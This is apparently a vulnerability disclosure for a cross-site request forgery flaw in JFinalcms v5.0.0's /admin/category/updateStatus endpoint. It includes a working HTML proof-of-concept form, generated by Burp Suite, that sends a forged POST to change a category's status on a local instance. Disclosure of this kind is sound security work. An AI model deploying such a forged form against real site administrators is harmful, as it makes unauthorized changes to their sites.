target:https://gitee.com/heyewei/JFinalcms

version:v5.0.0

JFinalcms v5.0.0 was discovered to contain a Cross-Site Request Forgery (CSRF) via the component /admin/category/updateStatus


![图片](https://github.com/nightcloudos/new_cms/assets/76925342/fdae78eb-8179-45d9-b853-10cea5be592b)


create poc：

![图片](https://github.com/nightcloudos/new_cms/assets/76925342/f7e406c7-17be-4955-8953-be7f8dbf4b5d)

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://127.0.0.1:8888/admin/category/updateStatus" method="POST">
      <input type="hidden" name="id" value="110" />
      <input type="hidden" name="value" value="false" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

successed

![图片](https://github.com/nightcloudos/new_cms/assets/76925342/b7ec8f4f-b700-47bb-9af7-1b884f56cf5e)
